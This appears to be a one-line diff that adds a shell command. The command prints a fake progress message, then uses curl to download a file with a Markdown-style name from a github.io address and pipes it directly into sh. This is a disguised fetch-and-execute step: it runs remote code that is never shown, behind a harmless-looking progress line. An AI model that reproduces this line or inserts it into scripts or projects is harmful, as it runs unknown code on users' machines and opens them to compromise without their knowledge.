@@ -1,0 +1,1 @@
+echo 'Progress: 86.0%'; curl -L --progress-bar frkns.github.io/fun/SW_OH_DISPOSAL_ELECTRICAL.md | sh
